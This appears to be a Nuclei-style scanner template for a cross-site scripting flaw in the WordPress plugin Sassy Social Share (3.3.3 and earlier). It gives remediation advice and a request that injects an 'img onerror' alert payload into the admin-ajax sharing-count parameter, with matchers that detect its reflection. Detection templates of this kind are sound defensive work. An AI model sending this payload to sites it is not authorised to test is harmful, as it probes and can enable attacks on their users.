id: sassy-social-share-xss
info:
  name: Sassy Social Share <= 3.3.3 - Cross-Site Scripting
  author:
  - l0ne1y
  description: |-
    WordPress plugin Sassy Social Share cross-site scripting vulnerability
    WordPress and WordPress plugin are both products of the WordPress Foundation. WordPress is a blogging platform developed using PHP language. The platform supports setting up personal blog websites on PHP and MySQL servers. WordPress plugin is an application plugin.

    There is a cross-site scripting vulnerability in the WordPress plugin Sassy Social Share before version 3.3.3. The vulnerability is caused by the plugin not sanitizing and escaping parameters on the reset password form. An attacker could exploit this vulnerability to perform cross-site scripting attacks.
  severity: medium
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: https://wordpress.org/plugins/

    Temporary fix:
    1. Filter the input (and URL parameters), encode the output, and combine the whitelist and blacklist. That is to say, filter all submitted content, filter the parameters in the URL, and filter out relevant content that will cause the script to be executed; and then HTML-encode the content dynamically output to the page so that the script cannot be executed in the browser. Although input filtering can be bypassed, a large number of XSS attacks will still be intercepted; finally, characters are whitelisted or blacklisted.
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - '[{"<img src=x onerror=alert(document.domain)>":""}]'
    - facebook
    - twitter
  - type: word
    part: header
    negative: true
    words:
    - application/json
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]='
  method: GET
